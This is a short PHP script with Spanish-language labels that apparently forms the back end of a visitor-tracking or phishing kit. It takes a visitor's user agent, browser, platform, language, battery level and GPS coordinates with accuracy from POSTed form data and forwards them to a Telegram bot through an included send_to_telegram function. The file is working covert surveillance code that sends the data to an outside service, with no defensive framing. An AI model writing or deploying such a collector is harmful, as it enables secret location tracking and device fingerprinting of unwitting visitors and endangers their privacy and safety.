<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/telegram.php';

$msg = "📲 <b>Info adicional del visitante</b>\n";

if(isset($_POST['agent'])){
    $msg .= "User-Agent: {$_POST['agent']}\n";
    $msg .= "Navegador: {$_POST['navegador']}\n";
    $msg .= "Versión: {$_POST['versionapp']}\n";
    $msg .= "Plataforma: {$_POST['plataforma']}\n";
    $msg .= "Idioma: {$_POST['idioma']}\n";
    $msg .= "Batería: {$_POST['bateria']}%\n";
}

$lat = $_POST['latitude'] ?? 'Desconocida';
$lon = $_POST['longitude'] ?? 'Desconocida';
$acc = $_POST['accuracy'] ?? 'Desconocida';

$msg .= "🌐 Latitud: $lat\n";
$msg .= "🌐 Longitud: $lon\n";
$msg .= "Precisión: $acc metros\n";

send_to_telegram($msg);
?>
